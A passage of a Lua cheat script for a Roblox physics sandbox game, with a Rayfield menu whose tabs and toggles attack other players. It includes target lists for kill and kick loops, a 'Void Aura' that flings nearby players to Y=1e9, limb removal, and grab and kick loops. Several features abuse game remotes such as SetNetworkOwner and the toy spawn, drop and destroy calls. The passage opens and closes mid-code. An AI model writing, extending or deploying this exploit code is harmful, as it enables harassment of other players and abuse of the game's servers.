            local newBlob = inv and inv:FindFirstChild("CreatureBlobman")
            if newBlob then
                local seat = newBlob:FindFirstChildOfClass("VehicleSeat")
                if seat then
                    seat:Sit(humanoid)
                    Rayfield:Notify({Title = "Blob", Content = "Spawn and sit", Duration = 2})
                end
            end
        end
    end
})
 
BlobTab:CreateButton({
    Name = "🔄 Spawn Blob",
    Callback = function()
        spawnBlobmanF()
        Rayfield:Notify({Title = "Blob", Content = "Spawn attempt", Duration = 2})
    end
})
 
BlobTab:CreateButton({
    Name = "🗑️ Blob Remove",
    Callback = function()
        if blobmanInstanceS and DestroyToy then
            DestroyToy:FireServer(blobmanInstanceS)
            blobmanInstanceS = nil
            Rayfield:Notify({Title = "Blob", Content = "Removed", Duration = 2})
        end
    end
})
 
BlobTab:CreateSection("⚔️ Blob Attack (List targets)")
 
BlobTab:CreateButton({
    Name = "💀 Blob kill",
    Callback = function() BlobAttackAll("kill") end
})
 
BlobTab:CreateButton({
    Name = "⚡ Blob Massless",
    Callback = function() BlobAttackAll("massless") end
})
 
BlobTab:CreateButton({
    Name = "🤚 Blob Grab",
    Callback = function() BlobAttackAll("grab") end
})
 
BlobTab:CreateButton({
    Name = "✋ Blob Release",
    Callback = function() BlobAttackAll("release") end
})
 
BlobTab:CreateButton({
    Name = "⬇️ Blob Drop",
    Callback = function() BlobAttackAll("drop") end
})
 
BlobTab:CreateSection("🔄 Blob Auto Loop")
 
BlobTab:CreateToggle({
    Name = "🔄 Loop Kill",
    CurrentValue = false,
    Callback = function(Value)
        blobLoopT3 = Value
        if Value then
            if #playersInLoop1V == 0 then
                Rayfield:Notify({Title = "Error", Content = "List is empty", Duration = 2})
                blobLoopT3 = false
                return
            end
            rawBlobLoopKill()
            Rayfield:Notify({Title = "Blob kill", Content = "Loop started", Duration = 2})
        else
            if blobKillThread then
                task.cancel(blobKillThread)
                blobKillThread = nil
            end
            Rayfield:Notify({Title = "Blob kill", Content = "Loop stopped", Duration = 2})
        end
    end
})
 
BlobTab:CreateToggle({
    Name = "🔄 Loop Kick",
    CurrentValue = false,
    Callback = function(Value)
        blobLoopT = Value
        if Value then
            if #playersInLoop1V == 0 then
                Rayfield:Notify({Title = "Error", Content = "List is empty", Duration = 2})
                blobLoopT = false
                return
            end
            rawBlobLoopKick()
            Rayfield:Notify({Title = "Blob kick", Content = "Loop started", Duration = 2})
        else
            if blobKickThread then
                task.cancel(blobKickThread)
                blobKickThread = nil
            end
            Rayfield:Notify({Title = "Blob kick", Content = "Loop stopped", Duration = 2})
        end
    end
})
 
BlobTab:CreateSection("✨ Gucci Settings")
 
local AutoGucciToggle = BlobTab:CreateToggle({
    Name = "Auto Gucci",
    CurrentValue = false,
    Callback = function(Value)
        AutoGucciT = Value
        if AutoGucciT then
            task.spawn(AutoGucciF)
            Rayfield:Notify({Title = "Gucci", Content = "Enabled", Duration = 2})
        else
            if plr.Character and plr.Character:FindFirstChild("Humanoid") then
                plr.Character.Humanoid.Sit = true
                task.wait(0.1)
                plr.Character.Humanoid.Sit = false
            end
            sitJumpT = false
            if blobmanInstanceS and DestroyToy then
                DestroyToy:FireServer(blobmanInstanceS)
                blobmanInstanceS = nil
            end
        end
    end
})
 
-- =============================================
-- [ House Fast TP Spam ]
-- =============================================
BlobTab:CreateSection("🏠 House Fast TP")
 
local FastPlotTPT = false
local fastPlotTPThread = nil
 
local function getMyPlotNumber()
    local plr = game.Players.LocalPlayer
    local Plots = workspace:FindFirstChild("Plots")
    if not Plots then return nil end
 
    for i = 1, 5 do
        local plot = Plots:FindFirstChild("Plot" .. i)
        if plot then
            local plotSign = plot:FindFirstChild("PlotSign")
            if plotSign then
                local owners = plotSign:FindFirstChild("ThisPlotsOwners")
                if owners then
                    for _, owner in ipairs(owners:GetChildren()) do
                        if owner:IsA("StringValue") and owner.Value == plr.Name then
                            return i
                        end
                    end
                end
            end
        end
    end
    return nil
end
 
local function getPlotCenter(plotNumber)
    local Plots = workspace:FindFirstChild("Plots")
    if not Plots then return nil end
 
    local plot = Plots:FindFirstChild("Plot" .. plotNumber)
    if not plot then return nil end
 
    local plotArea = plot:FindFirstChild("PlotArea")
    if plotArea and plotArea:IsA("BasePart") then
        return plotArea.Position + Vector3.new(0, 5, 0)
    end
 
    local barrier = plot:FindFirstChild("Barrier")
    if barrier then
        local totalPos = Vector3.new(0, 0, 0)
        local count = 0
        for _, part in ipairs(barrier:GetChildren()) do
            if part:IsA("BasePart") then
                totalPos = totalPos + part.Position
                count = count + 1
            end
        end
        if count > 0 then
            return (totalPos / count) + Vector3.new(0, 5, 0)
        end
    end
 
    return nil
end
 
local function fastPlotTPLoop()
    while FastPlotTPT do
        pcall(function()
            local char = game.Players.LocalPlayer.Character
            if not char then return end
 
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if not hrp then return end
 
            local myPlotNum = getMyPlotNumber()
            if not myPlotNum then return end
 
            local targetPos = getPlotCenter(myPlotNum)
            if not targetPos then return end
 
            hrp.CFrame = CFrame.new(targetPos)
 
            for i = 1, 5 do
                hrp.CFrame = CFrame.new(targetPos)
                task.wait()
            end
        end)
        task.wait()
    end
end
 
local FastPlotTPToggle = BlobTab:CreateToggle({
    Name = "⚡ House Fast TP",
    CurrentValue = false,
    Callback = function(Value)
        FastPlotTPT = Value
 
        if Value then
            local myPlotNum = getMyPlotNumber()
            if not myPlotNum then
                Rayfield:Notify({ Title = "❌ Error", Content = "You don't own a house", Duration = 2 })
                FastPlotTPToggle:Set(false)
                return
            end
 
            if fastPlotTPThread then
                task.cancel(fastPlotTPThread)
            end
            fastPlotTPThread = task.spawn(fastPlotTPLoop)
 
            Rayfield:Notify({ Title = "Loop TP?", Content = "Plot " .. myPlotNum .. " Spam started", Duration = 2 })
        else
            if fastPlotTPThread then
                task.cancel(fastPlotTPThread)
                fastPlotTPThread = nil
            end
 
            Rayfield:Notify({ Title = "⚡ Loop TP?", Content = "Stopped", Duration = 2 })
        end
    end
})
 
BlobTab:CreateParagraph({ Title = "📌 Description", Content = "?" })
 
-- =============================================
-- [ Grab Tab ]
-- =============================================
GrabTab:CreateSection("🔄 Grab Attack")
 
local LoopGrabToggle = GrabTab:CreateToggle({
    Name = "🔄 Do Not Use",
    CurrentValue = false,
    Callback = function(Value)
        AntiStruggleGrabT = Value
        AntiStruggleGrabF()
        Rayfield:Notify({Title = "Loop Grab", Content = Value and "Enabled" or "Disabled", Duration = 2})
    end
})
 
-- =============================================
-- [ Aura Tab ]
-- =============================================
AuraTab:CreateSection("🌀 Anti Sticky Aura")
 
local AntiStickyAuraToggle = AuraTab:CreateToggle({
    Name = "Anti Sticky Aura",
    CurrentValue = false,
    Callback = function(Value)
        AntiStickyAuraT = Value
        AntiStickyAuraF()
        Rayfield:Notify({Title = "Anti Sticky", Content = Value and "Enabled" or "Disabled", Duration = 2})
    end
})
 
AuraTab:CreateParagraph({ Title = "Description", Content = "Automatically claim ownership of sticky parts within 30 studs" })
 
-- =============================================
-- [ Aura Tab - Void Aura (20 studs) ]
-- =============================================
AuraTab:CreateSection("🌀 Void Aura")
 
local VoidAuraEnabled = false
local VoidAuraThread = nil
 
local function VoidAuraFunction()
    while VoidAuraEnabled do
        pcall(function()
            local myChar = plr.Character
            if not myChar then return end
 
            local myPos = myChar:FindFirstChild("HumanoidRootPart")
            if not myPos then return end
 
            for _, player in ipairs(Players:GetPlayers()) do
                if player ~= plr and player.Character then
                    local hrp = player.Character:FindFirstChild("HumanoidRootPart")
                    if hrp then
                        -- 20 studs distance check
                        local dist = (myPos.Position - hrp.Position).Magnitude
                        if dist < 20 then
                            -- Teleport to Y=1e9
                            hrp.CFrame = CFrame.new(hrp.Position.X, 1000000000, hrp.Position.Z)
                        end
                    end
                end
            end
        end)
        task.wait(0.1) -- check every 0.1s
    end
end
 
local VoidAuraToggle = AuraTab:CreateToggle({
    Name = "🌀 Void Aura (20 studs)",
    CurrentValue = false,
    Callback = function(Value)
        VoidAuraEnabled = Value
        if Value then
            if VoidAuraThread then
                task.cancel(VoidAuraThread)
            end
            VoidAuraThread = task.spawn(VoidAuraFunction)
            Rayfield:Notify({ Title = "🌀 Void Aura", Content = "20 studs Enabled", Duration = 2 })
        else
            if VoidAuraThread then
                task.cancel(VoidAuraThread)
                VoidAuraThread = nil
            end
            Rayfield:Notify({ Title = "🌀 Void Aura", Content = "Disabled", Duration = 2 })
        end
    end
})
 
AuraTab:CreateParagraph({
    Title = "📌 Description",
    Content = "• Send enemies within 20 studs to Y=1e9\n• They fall from the sky"
})
-- =============================================
-- [ Security Tab ]
-- =============================================
SecurityTab:CreateSection("🔰 Defense Settings")
 
local AntiVoidToggle = SecurityTab:CreateToggle({
    Name = "Anti Void",
    CurrentValue = true,
    Callback = function(Value)
        if Value then
            Workspace.FallenPartsDestroyHeight = -500000000
        else
            Workspace.FallenPartsDestroyHeight = -100
        end
    end
})
AntiVoidToggle:Set(true)
 
local AntiMasslessToggle = SecurityTab:CreateToggle({
    Name = "⚖️ Anti Massless",
    CurrentValue = false,
    Callback = function(Value)
        antiMasslessEnabled = Value
        AntiMasslessF()
        Rayfield:Notify({Title = "Anti Massless", Content = Value and "Enabled" or "Disabled", Duration = 2})
    end
})
 
local AntiBurnToggle = SecurityTab:CreateToggle({
    Name = "🔥 Anti-burn",
    CurrentValue = false,
    Callback = function(Value)
        AntiBurnV = Value
        if Value then
            AntiBurn()
            Rayfield:Notify({Title = "Anti-burn", Content = "Enabled", Duration = 2})
        end
    end
})
 
local AntiExplodeToggle = SecurityTab:CreateToggle({
    Name = "💥 Anti-explosion",
    CurrentValue = false,
    Callback = function(Value)
        AntiExplosionT = Value
        if Value then
            AntiExplosionF()
            Rayfield:Notify({Title = "Anti-explosion", Content = "Enabled", Duration = 2})
        else
            if AntiExplosionC then
                AntiExplosionC:Disconnect()
                AntiExplosionC = nil
            end
            Rayfield:Notify({Title = "Anti-explosion", Content = "Disabled", Duration = 2})
        end
    end
})
 
local AntiPaintToggle = SecurityTab:CreateToggle({
    Name = "🎨 Anti-paint",
    CurrentValue = false,
    Callback = function(Value)
        AntiPaintT = Value
        if Value then
            AntiPaintF()
            Rayfield:Notify({Title = "Anti-paint", Content = "Enabled", Duration = 2})
        else
            if AntiPaintThread then
                task.cancel(AntiPaintThread)
                AntiPaintThread = nil
            end
        end
    end
})
 
-- =============================================
-- [ Burger Macro (Security Tab) ]
-- =============================================
SecurityTab:CreateSection("Anti Release")
 
local BurgerMacroT = false
local burgerMacroThread = nil
local burgerSpawnThread = nil
 
local function startBurgerMacro()
    local Players = game:GetService("Players")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local Workspace = game:GetService("Workspace")
 
    local player = Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local rootPart = character:WaitForChild("HumanoidRootPart")
 
    local spawnedToysFolder = Workspace:WaitForChild(player.Name .. "SpawnedInToys")
 
    burgerSpawnThread = task.spawn(function()
        while BurgerMacroT do
            local currentBurger = spawnedToysFolder:FindFirstChild("FoodHamburger")
            if not currentBurger then
                local spawnOffset = CFrame.new(-3.53, 0, 3.53)
                local spawnCFrame = rootPart.CFrame * spawnOffset
 
                local spawnArgs = { [1] = "FoodHamburger", [2] = spawnCFrame, [3] = Vector3.new(0, 140, 0) }
 
                task.spawn(function()
                    pcall(function()
                        ReplicatedStorage:WaitForChild("MenuToys"):WaitForChild("SpawnToyRemoteFunction"):InvokeServer(unpack(spawnArgs))
                    end)
                end)
            end
            task.wait(0.3)
        end
    end)
 
    burgerMacroThread = task.spawn(function()
        while BurgerMacroT do
            local currentBurger = spawnedToysFolder:FindFirstChild("FoodHamburger")
 
            if currentBurger then
                local holdPart = currentBurger:FindFirstChild("HoldPart")
                if holdPart then
                    local holdRemote = holdPart:FindFirstChild("HoldItemRemoteFunction")
                    local dropRemote = holdPart:FindFirstChild("DropItemRemoteFunction")
 
                    if holdRemote and dropRemote then
                        task.spawn(function()
                            pcall(function() holdRemote:InvokeServer(currentBurger, character) end)
                        end)
 
                        task.wait(0.018)
                        if not BurgerMacroT then break end
 
                        task.spawn(function()
                            pcall(function()
                                local dropCFrame = CFrame.new(rootPart.Position.X, 99999, rootPart.Position.Z)
                                dropRemote:InvokeServer(currentBurger, dropCFrame, Vector3.new(0, 0, 0))
                            end)
                        end)
                    else
                        task.wait()
                    end
                else
                    task.wait()
                end
            else
                task.wait()
            end
        end
    end)
end
 
local function stopBurgerMacro()
    BurgerMacroT = false
 
    if burgerSpawnThread then
        task.cancel(burgerSpawnThread)
        burgerSpawnThread = nil
    end
 
    if burgerMacroThread then
        task.cancel(burgerMacroThread)
        burgerMacroThread = nil
    end
 
    pcall(function()
        local player = game.Players.LocalPlayer
        local spawnedToysFolder = workspace:FindFirstChild(player.Name .. "SpawnedInToys")
        if spawnedToysFolder then
            local burger = spawnedToysFolder:FindFirstChild("FoodHamburger")
            if burger then
                ReplicatedStorage:WaitForChild("MenuToys"):WaitForChild("DestroyToy"):FireServer(burger)
            end
        end
    end)
end
 
local BurgerMacroToggle = SecurityTab:CreateToggle({
    Name = "Anti Release",
    CurrentValue = false,
    Callback = function(Value)
        BurgerMacroT = Value
 
        if Value then
            startBurgerMacro()
            Rayfield:Notify({ Title = "Anti Release", Content = "Enabled", Duration = 2 })
        else
            stopBurgerMacro()
            Rayfield:Notify({ Title = "Anti Release", Content = "Disabled", Duration = 2 })
        end
    end
})
 
local burgerStatusLabel = SecurityTab:CreateLabel("Burger Status: -", 4483362458)
 
spawn(function()
    while true do
        if BurgerMacroT then
            pcall(function()
                local player = game.Players.LocalPlayer
                local spawnedToysFolder = workspace:FindFirstChild(player.Name .. "SpawnedInToys")
                if spawnedToysFolder and spawnedToysFolder:FindFirstChild("FoodHamburger") then
                    burgerStatusLabel:Set("Burger Status: ✅ Present")
                else
                    burgerStatusLabel:Set("Burger Status: ❌ None (spawning)")
                end
            end)
        else
            burgerStatusLabel:Set("Burger Status: -")
        end
        task.wait(0.5)
    end
end)
 
SecurityTab:CreateParagraph({ Title = "Burger", Content = "yummy" })
 
-- =============================================
-- [ KickGrab Tab ]
-- =============================================
KickGrabTab:CreateSection("🎯 KickGrab Target List")
 
local KickGrabTargetDropdown = KickGrabTab:CreateDropdown({
    Name = "Kick Grab List",
    Options = kickGrabTargetList,
    CurrentOption = {"Open"},
    MultipleOptions = true,
    Flag = "KickGrabMainDropdown",
    Callback = function(Options) kickGrabTargetList = Options end
})
 
KickGrabTab:CreateInput({
    Name = "Add",
    PlaceholderText = "Enter nickname",
    RemoveTextAfterFocusLost = true,
    Flag = "KickGrabAddInput",
    Callback = function(Value)
        if not Value or Value == "" then return end
 
        local target = findPlayerByPartialName(Value)
        if not target then
            Rayfield:Notify({Title = "KickGrab", Content = "Player not found", Duration = 2})
            return
        end
 
        for _, name in ipairs(kickGrabTargetList) do
            if name == target.Name then
                Rayfield:Notify({Title = "KickGrab", Content = "Already in List", Duration = 2})
                return
            end
        end
 
        table.insert(kickGrabTargetList, target.Name)
        pcall(function() KickGrabTargetDropdown:Refresh(kickGrabTargetList, true) end)
        Rayfield:Notify({Title = "KickGrab", Content = "Add: " .. target.Name, Duration = 2})
    end
})
 
KickGrabTab:CreateInput({
    Name = "Remove",
    PlaceholderText = "Enter nickname",
    RemoveTextAfterFocusLost = true,
    Flag = "KickGrabRemoveInput",
    Callback = function(Value)
        if not Value or Value == "" then return end
 
        for i, name in ipairs(kickGrabTargetList) do
            if name:lower() == Value:lower() then
                table.remove(kickGrabTargetList, i)
                pcall(function() KickGrabTargetDropdown:Refresh(kickGrabTargetList, true) end)
                Rayfield:Notify({Title = "KickGrab", Content = "Remove: " .. name, Duration = 2})
                return
            end
        end
        Rayfield:Notify({Title = "KickGrab", Content = "Name not found in List", Duration = 2})
    end
})
 
KickGrabTab:CreateButton({
    Name = "🗑️ Clear List",
    Callback = function()
        kickGrabTargetList = {}
        pcall(function() KickGrabTargetDropdown:Refresh(kickGrabTargetList, true) end)
        Rayfield:Notify({Title = "KickGrab", Content = "List cleared", Duration = 2})
    end
})
 
KickGrabTab:CreateSection("⚙️ Mode Settings")
 
local ModeDropdown = KickGrabTab:CreateDropdown({
    Name = "Mode select",
    Options = {"Camera", "Up", "Down"},
    CurrentOption = {"Camera"},
    MultipleOptions = false,
    Callback = function(Options)
        KickGrabState.Mode = Options[1]
        Rayfield:Notify({Title = "KickGrab", Content = "Mode: " .. Options[1], Duration = 2})
    end
})
 
local DistInput = KickGrabTab:CreateInput({
    Name = "Camera distance",
    CurrentValue = "19",
    PlaceholderText = "distance",
    RemoveTextAfterFocusLost = false,
    Callback = function(Value)
        local num = tonumber(Value)
        if num then KickGrabState.DetentionDist = num end
    end
})
 
KickGrabTab:CreateSection("🎮 Execute")
 
local KickGrabToggle = KickGrabTab:CreateToggle({
    Name = "👢 Kick Grab",
    CurrentValue = false,
    Callback = function(Value)
        if Value and #kickGrabTargetList == 0 then
            Rayfield:Notify({Title = "Error", Content = "Target List is empty", Duration = 2})
            KickGrabToggle:Set(false)
            return
        end
        KickGrabState.Looping = Value
        if Value then
            task.spawn(ExecuteKickGrabLoop)
            Rayfield:Notify({Title = "KickGrab", Content = "Enabled", Duration = 2})
        else
            Rayfield:Notify({Title = "KickGrab", Content = "Disabled", Duration = 2})
        end
    end
})
 
local AutoRagdollToggle = KickGrabTab:CreateToggle({
    Name = "🔄 Auto Ragdoll",
    CurrentValue = false,
    Callback = function(Value)
        KickGrabState.AutoRagdoll = Value
        Rayfield:Notify({Title = "Auto Ragdoll", Content = Value and "Enabled" or "Disabled", Duration = 2})
    end
})
 
local SnowBallToggle = KickGrabTab:CreateToggle({
    Name = "❄️ Snowball",
    CurrentValue = false,
    Callback = function(Value)
        if Value and #kickGrabTargetList == 0 then
            Rayfield:Notify({Title = "Error", Content = "Target List is empty", Duration = 2})
            SnowBallToggle:Set(false)
            return
        end
        KickGrabState.SnowBallLooping = Value
        if Value then
            task.spawn(ExecuteSnowballLoop)
            Rayfield:Notify({Title = "Snowball", Content = "Enabled", Duration = 2})
        else
            Rayfield:Notify({Title = "Snowball", Content = "Disabled", Duration = 2})
        end
    end
})
 
-- =============================================
-- [ LoopGrab Tab ]
-- =============================================
LoopGrabTab:CreateSection("🎮 Control")
 
local LoopToggleButton = LoopGrabTab:CreateToggle({
    Name = "🔄 LoopGrab Execute",
    CurrentValue = false,
    Flag = "LoopGrabMainToggle",
    Callback = function(Value)
        local success, err = pcall(function()
            if Value then
                if getgenv().LoopGrabActive then
                    Rayfield:Notify({ Title = "🔄 Loop Grab", Content = "Already on!", Duration = 2 })
                    LoopToggleButton:Set(false)
                    return
                end
 
                getgenv().LoopGrabActive = true
 
                Rayfield:Notify({ Title = "🔄 Loop Grab", Content = "Loop Grab is on.", Duration = 2 })
 
                task.spawn(function()
                    while getgenv().LoopGrabActive do
                        local grabParts = workspace:FindFirstChild("GrabParts")
                        if not grabParts then task.wait() continue end
 
                        local gp = grabParts:FindFirstChild("GrabPart")
                        local weld = gp and gp:FindFirstChildOfClass("WeldConstraint")
                        local part1 = weld and weld.Part1
 
                        if part1 then
                            local ownerPlayer = nil
                            for _, pl in ipairs(Players:GetPlayers()) do
                                if pl.Character and part1:IsDescendantOf(pl.Character) then
                                    ownerPlayer = pl
                                    break
                                end
                            end
 
                            while getgenv().LoopGrabActive and workspace:FindFirstChild("GrabParts") do
                                if ownerPlayer then
                                    local tgtTorso = ownerPlayer.Character and ownerPlayer.Character:FindFirstChild("HumanoidRootPart") 
                                    local tgtHead = ownerPlayer.Character and ownerPlayer.Character:FindFirstChild("Head")
                                    local myTorso = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") 
 
                                    if tgtTorso and myTorso and tgtHead then
                                        pcall(function() SetNetworkOwner:FireServer(tgtTorso, CFrame.lookAt(myTorso.Position, tgtTorso.Position)) end)
                                    end
                                else
                                    if part1.Parent then
                                        local myTorso = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
                                        if myTorso then
                                            pcall(function() SetNetworkOwner:FireServer(part1, CFrame.lookAt(myTorso.Position, part1.Position)) end)
                                        end
                                    end
                                end
                                task.wait()
                            end
                        end
                        task.wait()
                    end
                end)
            else
                if not getgenv().LoopGrabActive then
                    Rayfield:Notify({ Title = "🔄 Loop Grab", Content = "Already off!", Duration = 2 })
                    return
                end
 
                getgenv().LoopGrabActive = false
                Rayfield:Notify({ Title = "🔄 Loop Grab", Content = "Loop Grab is off.", Duration = 2 })
            end
        end)
 
        if not success then
            print("❌ LoopGrab Error:", err)
            Rayfield:Notify({ Title = "⚠️ Error", Content = "LoopGrab Error occurred", Duration = 2 })
            LoopToggleButton:Set(false)
        end
    end
})
 
LoopGrabTab:CreateButton({
    Name = "⏹️ Force Stop",
    Flag = "LoopGrabStopButton",
    Callback = function()
        pcall(function()
            getgenv().LoopGrabActive = false
            LoopToggleButton:Set(false)
            Rayfield:Notify({ Title = "🔄 Loop Grab", Content = "Forced stop", Duration = 2 })
        end)
    end
})
 
LoopGrabTab:CreateSection("📊 Status")
 
local LoopStatusLabel = LoopGrabTab:CreateLabel("Idle...", 4483362458)
 
spawn(function()
    while task.wait(0.2) do
        pcall(function()
            if getgenv().LoopGrabActive then
                LoopStatusLabel:Set("🟢 Executing")
            else
                LoopStatusLabel:Set("⚫ Idle")
            end
        end)
    end
end)
 
-- =============================================
-- [ KillGrab Tab ]
-- =============================================
KillGrabTab:CreateSection("⚔️ KillGrab Settings")
 
KillGrabTab:CreateToggle({
    Name = "🔪 KillGrab Enabled",
    CurrentValue = false,
    Callback = function(Value)
        KillGrabEnabled = Value
        KillGrabF()
        Rayfield:Notify({ Title = "KillGrab", Content = Value and "Enabled (kill the grabber instantly)" or "Disabled", Duration = 2 })
    end
})
 
KillGrabTab:CreateParagraph({ Title = "Description", Content = "If enabled, when someone grabs you, the grabber dies instantly." })
 
-- =============================================
-- [ Set Kill Player Tab ]
-- =============================================
TargetTab:CreateSection("🎯 Set Kill Player")
 
local TargetListDropdown = TargetTab:CreateDropdown({
    Name = "List",
    Options = targetList,
    CurrentOption = {"Open"},
    MultipleOptions = true,
    Callback = function(Options) targetList = Options end
})
 
TargetTab:CreateInput({
    Name = "Add",
    PlaceholderText = "Enter nickname",
    RemoveTextAfterFocusLost = true,
    Callback = function(Value)
        if not Value or Value == "" then return end
 
        local target = findPlayerByPartialName(Value)
        if not target then
            Rayfield:Notify({Title = "Target", Content = "Player not found", Duration = 2})
            return
        end
 
        for _, name in ipairs(targetList) do
            if name == target.Name then
                Rayfield:Notify({Title = "Target", Content = "Already in list", Duration = 2})
                return
            end
        end
 
        table.insert(targetList, target.Name)
        TargetListDropdown:Refresh(targetList, true)
        Rayfield:Notify({Title = "Target", Content = "Add: " .. target.Name, Duration = 2})
    end
})
 
TargetTab:CreateInput({
    Name = "Remove",
    PlaceholderText = "Enter nickname",
    RemoveTextAfterFocusLost = true,
    Callback = function(Value)
        if not Value or Value == "" then return end
 
        for i, name in ipairs(targetList) do
            if name:lower() == Value:lower() then
                table.remove(targetList, i)
                TargetListDropdown:Refresh(targetList, true)
                Rayfield:Notify({Title = "Target", Content = "Remove: " .. name, Duration = 2})
                return
            end
        end
        Rayfield:Notify({Title = "Target", Content = "Name not found", Duration = 2})
    end
})
 
TargetTab:CreateSection("⚔️ Execute")
 
TargetTab:CreateButton({ Name = "💀 Kill", Callback = function() manualKill("kill") end })
TargetTab:CreateButton({ Name = "👢 Kick", Callback = function() manualKill("kick") end })
 
local DeletePartDropdown = TargetTab:CreateDropdown({
    Name = "🦴 Remove Part",
    Options = {"Arms/Legs", "All Legs", "All Arms"},
    CurrentOption = {"Arms/Legs"},
    Callback = function(Options) selectedDeletePart = Options[1] end
})
 
TargetTab:CreateButton({
    Name = "🦴 Remove Target Limbs",
    Callback = function()
        local count = 0
        for _, targetName in ipairs(targetList) do
            local target = Players:FindFirstChild(targetName)
            if target then
                teleportParts(target, selectedDeletePart)
                count = count + 1
            end
            task.wait(0.2)
        end
        Rayfield:Notify({Title = "Limb Remove", Content = count .. " people processed", Duration = 3})
    end
})
 
TargetTab:CreateButton({
    Name = "🎯 Remove Current Grab Target",
    Callback = function()
        local beamPart = Workspace:FindFirstChild("GrabParts") and Workspace.GrabParts:FindFirstChild("BeamPart")
        if beamPart then
            local targetPlayer = getClosestPlayer(beamPart)
            if targetPlayer then
                teleportParts(targetPlayer, selectedDeletePart)
                Rayfield:Notify({Title = "Limb Remove", Content = targetPlayer.Name, Duration = 2})
            end
        end
    end
})
 
TargetTab:CreateSection("📋 Selected Players")
local SelectedLabel = TargetTab:CreateLabel("Selected: 0", 4483362458)
spawn(function() while task.wait(0.5) do SelectedLabel:Set("Selected: " .. #targetList) end end)
 
-- =============================================
-- [ House Teleport Tab ]
-- =============================================
HouseTeleportTab:CreateSection("🏡 House List")
 
local houses = {
    {"🔵 Blue House", 502.693054, 83.3367615, -340.893524},
    {"🟢 Green House", -352, 98, 353},
    {"🔴 Red House", 551, 123, -73},
    {"🟣 Purple House", 249, -7, 461},
    {"🌸 Pink House", -484, -7, -165},
    {"🏮 Chinese House", 513, 83, -341},
}
 
for i, house in ipairs(houses) do
    HouseTeleportTab:CreateButton({
        Name = house[1],
        Callback = function()
            teleportTo(house[1], house[2], house[3], house[4])
        end
    })
end
 
HouseTeleportTab:CreateSection("🗺️ Other Places")
 
local places = {
    {"⛰️ Spawn Mountain", 494, 163, 175},
    {"❄️ Snow Mountain", -394, 230, 509},
    {"🏡 Barn", -156, 59, -291},
    {"⚠️ Up Danger Zone", 125, -7, 241},
    {"☁️ Sky Island", 63, 346, 309},
    {"🕳️ Big Cave", -240, 29, 554},
    {"🕳️ Small Cave", -84, 14, -310},
    {"🚂 Train Cave", 602, 45, -175},
    {"⛏️ Mine", -308, -7, 506},
    {"📍 Spawn", 0, -7, 0},
}
 
for i, place in ipairs(places) do
    HouseTeleportTab:CreateButton({
        Name = place[1],
        Callback = function()
            teleportTo(place[1], place[2], place[3], place[4])
        end
    })
end
 
HouseTeleportTab:CreateSection("📍 Current Position")
 
HouseTeleportTab:CreateButton({
    Name = "🔄 Check My Position",
    Callback = function()
        local char = plr.Character
        if char and char:FindFirstChild("HumanoidRootPart") then
            local pos = char.HumanoidRootPart.Position
            Rayfield:Notify({
                Title = "📌 Current Position",
                Content = string.format("X: %.1f, Y: %.1f, Z: %.1f", pos.X, pos.Y, pos.Z),
                Duration = 3
            })
        end
    end
})
 
-- =============================================
-- [ Notification Tab ]
-- =============================================
NotifyTab:CreateSection("🔔 Notification Settings")
 
local KickNotifyToggle = NotifyTab:CreateToggle({
    Name = "👢 Kick Notification",
    CurrentValue = true,
    Callback = function(Value) kickNotificationsEnabled = Value end
})
KickNotifyToggle:Set(true)
 
local BlobNotifyToggle = NotifyTab:CreateToggle({
    Name = "🦠 Blob Notification",
    CurrentValue = true,
    Callback = function(Value)
        blobNotificationsEnabled = Value
        if Value then
            setupBlobNotifications()
        else
            if AntiBlobConnection then
                AntiBlobConnection:Disconnect()
                AntiBlobConnection = nil
            end
        end
    end
})
BlobNotifyToggle:Set(true)
 
-- =============================================
-- [ House Gucci Tab - includes Auto Cleanup ]
-- =============================================
GucciTab:CreateSection("🏠 House Gucci")
 
local PlotGucciT = false
local plotGucciThread = nil
local plotSitJumpT = false
local plotRagdollLoopD = false
 
local function getMyPlotNumber()
    local plr = game.Players.LocalPlayer
    local Plots = workspace:FindFirstChild("Plots")
    if not Plots then return nil end
 
    for i = 1, 5 do
        local plot = Plots:FindFirstChild("Plot" .. i)
        if plot then
            local plotSign = plot:FindFirstChild("PlotSign")
            if plotSign then
                local owners = plotSign:FindFirstChild("ThisPlotsOwners")
                if owners then
                    for _, owner in ipairs(owners:GetChildren()) do
                        if owner:IsA("StringValue") and owner.Value == plr.Name then
                            return i
                        end
                    end
                end
            end
        end
    end
    return nil
end
 
local function findBlobInPlot()
    local plotNumber = getMyPlotNumber()
    if not plotNumber then return nil end
 
    local plotItems = workspace:FindFirstChild("PlotItems")
    if not plotItems then return nil end
 
    local myPlot = plotItems:FindFirstChild("Plot" .. plotNumber)
    if not myPlot then return nil end
 
    for _, item in ipairs(myPlot:GetChildren()) do
        if item.Name == "CreatureBlobman" then
            return item
        end
    end
    return nil
end
 
local function findBlobInInventory()
    local plr = game.Players.LocalPlayer
    local inv = workspace:FindFirstChild(plr.Name .. "SpawnedInToys")
    return inv and inv:FindFirstChild("CreatureBlobman")
end
 
local function findBlob()
    local plotBlob = findBlobInPlot()
    if plotBlob then return plotBlob end
    return findBlobInInventory()
end
 
local function spawnBlobInPlot()
    local plr = game.Players.LocalPlayer
    local char = plr.Character
    if not char then return nil end
 
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return nil end
 
    local plotNumber = getMyPlotNumber()
    if not plotNumber then return nil end
 
    local SpawnToyRemote = rs and rs:FindFirstChild("MenuToys") and rs.MenuToys:FindFirstChild("SpawnToyRemoteFunction")
    if not SpawnToyRemote then return nil end
 
    local plotItems = workspace:FindFirstChild("PlotItems")
    local myPlot = plotItems and plotItems:FindFirstChild("Plot" .. plotNumber)
 
    if myPlot then
        local spawnPos = myPlot:FindFirstChild("SpawnLocation") or myPlot:FindFirstChildWhichIsA("BasePart")
        if spawnPos then
            pcall(function()
                SpawnToyRemote:InvokeServer("CreatureBlobman", spawnPos.CFrame * CFrame.new(0, 5, 0), Vector3.new(0, 0, 0))
            end)
 
            local tries = 0
            repeat
                task.wait(0.2)
                local blob = findBlobInPlot()
                if blob then return blob end
                tries = tries + 1
            until tries > 10
        end
    end
    return nil
end
 
local function plotRagdollLoop()
    if plotRagdollLoopD then return end
    plotRagdollLoopD = true
 
    while plotSitJumpT do
        local char = game.Players.LocalPlayer.Character
